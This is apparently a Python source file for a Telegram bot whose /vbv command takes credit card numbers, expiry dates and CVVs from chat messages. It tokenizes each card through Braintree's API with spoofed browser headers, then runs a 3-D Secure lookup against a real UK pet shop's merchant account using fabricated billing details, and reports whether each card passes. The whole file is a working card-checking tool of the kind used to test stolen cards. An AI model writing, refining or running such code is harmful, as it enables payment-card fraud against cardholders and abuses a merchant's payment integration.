import requests
import time
import logging
from fake_useragent import UserAgent
from pyrogram import Client, filters
from EQUROBOT import app

# Initialize the logging
logging.basicConfig(level=logging.INFO)

# Set up the User-Agent
user = UserAgent().random

# Braintree API headers
braintree_headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,ar-DZ;q=0.8,ar;q=0.7',
    'authorization': 'Bearer <your_braintree_authorization_token>',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': user,
}

# Function to process card details
def process_card(card_details):
    card_number, exp_month, exp_year, cvc = card_details.split('|')
    exp_year = exp_year if "20" in exp_year else f'20{exp_year}'
    exp_month = exp_month.zfill(2)

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': '29c79d38-1232-4777-95eb-265e966d3417',
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': card_number,
                    'expirationMonth': exp_month,
                    'expirationYear': exp_year,
                    'cvv': cvc,
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    response = requests.post('https://payments.braintree-api.com/graphql', headers=braintree_headers, json=json_data)
    try:
        return response.json()
    except ValueError as e:
        logging.error(f"Failed to parse JSON response from Braintree API: {e}")
        return None

# Function to perform VBV check
def vbv_check(token):
    vbv_headers = {
        'authority': 'api.braintreegateway.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,ar-DZ;q=0.8,ar;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://www.healthfulpets.co.uk',
        'referer': 'https://www.healthfulpets.co.uk/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': user,
    }

    json_data = {
        'amount': '19.47',
        'additionalInfo': {
            'billingLine1': ' 303 N Walnut Creek Dr',
            'billingCity': 'Mansfield',
            'billingPostalCode': 'OX17 2LU',
            'billingCountryCode': 'GB',
            'billingPhoneNumber': '(435) 678-8763',
            'billingGivenName': 'Salah',
            'billingSurname': 'Berges',
        },
        'challengeRequested': True,
        'bin': '415464',
        'dfReferenceId': '0_96e6b2fd-f129-4f22-8c4b-e86ed4e83e5f',
        'clientMetadata': {
            'requestedThreeDSecureVersion': '2',
            'sdkVersion': 'web/3.94.0',
            'cardinalDeviceDataCollectionTimeElapsed': 247,
            'issuerDeviceDataCollectionTimeElapsed': 10495,
            'issuerDeviceDataCollectionResult': False,
        },
        'authorizationFingerprint': 'your_authorization_fingerprint',
        'braintreeLibraryVersion': 'braintree/web/3.94.0',
        '_meta': {
            'merchantAppId': 'www.healthfulpets.co.uk',
            'platform': 'web',
            'sdkVersion': '3.94.0',
            'source': 'client',
            'integration': 'custom',
            'integrationType': 'custom',
            'sessionId': '29c79d38-1232-4777-95eb-265e966d3417',
        },
    }

    response = requests.post(
        f'https://api.braintreegateway.com/merchants/msynz5rks6qbhss2/client_api/v1/payment_methods/{token}/three_d_secure/lookup',
        headers=vbv_headers,
        json=json_data,
    )
    try:
        return response.json()
    except ValueError as e:
        logging.error(f"Failed to parse JSON response from Braintree VBV API: {e}")
        return None

# Telegram bot command handler for VBV
@app.on_message(filters.command("vbv"))
async def vbv(client, message):
    ID = message.chat.id
    card_details = message.text.split(' ')[1]  # Assuming the card details are provided after the command

    response = process_card(card_details)
    
    logging.info(f"Card process response: {response}")

    if response is None:
        result_msg = f'❌ Failed to get a response for {card_details}'
    elif isinstance(response, dict) and 'data' in response and 'tokenizeCreditCard' in response['data'] and 'token' in response['data']['tokenizeCreditCard']:
        token = response['data']['tokenizeCreditCard']['token']
        
        vbv_response = vbv_check(token)
        
        logging.info(f"VBV check response: {vbv_response}")

        if vbv_response and isinstance(vbv_response, dict) and 'paymentMethod' in vbv_response and 'threeDSecureInfo' in vbv_response['paymentMethod'] and 'status' in vbv_response['paymentMethod']['threeDSecureInfo']:
            msg = vbv_response["paymentMethod"]["threeDSecureInfo"]["status"]

            if 'authenticate_attempt_successful' in msg:
                result_msg = f'✅ {card_details} -> {msg}'
            else:
                result_msg = f'❌ {card_details} -> {msg}'
        else:
            result_msg = f'❌ VBV check failed for {card_details}'
    else:
        result_msg = f'❌ Failed to extract token for {card_details}'

    await app.send_message(ID, result_msg)
    time.sleep(5)
